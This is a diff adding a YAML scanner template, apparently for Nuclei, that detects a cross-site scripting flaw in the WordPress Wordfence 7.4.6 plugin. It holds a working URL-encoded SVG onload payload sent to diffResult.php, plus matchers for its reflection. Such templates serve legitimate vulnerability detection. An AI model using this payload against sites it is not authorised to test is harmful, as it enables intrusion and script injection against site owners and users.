@@ -1,0 +1,49 @@
+id: wordpress-wordfence-xss
+
+info:
+  name: WordPress Wordfence 7.4.6 - Cross0Site Scripting
+  author: madrobot
+  severity: medium
+  description: WordPress Wordfence 7.4.6 is vulnerable to cross-site scripting.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-80
+  metadata:
+    max-request: 2
+  tags: wordpress,wp-plugin,xss,wordfence,vuln
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /wp-content/plugins/wordfence/readme.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        internal: true
+        words:
+          - 'Wordfence Security - '
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/wordfence/lib/diffResult.php?file=%27%3E%22%3Csvg%2Fonload=confirm%28%27test%27%29%3E"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "'>\"<svg/onload=confirm('test')>"
+        part: body
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a004830460221009f002400059c07135d5fb01044c7b5afe0f52c7161e701212a2184d86650b35f022100ba1862ad3cb8c34ac842a4f31ce84f477ba7163d62b672de799b4e76c59f6603:922c64590222798bb761d5b6d8e72950
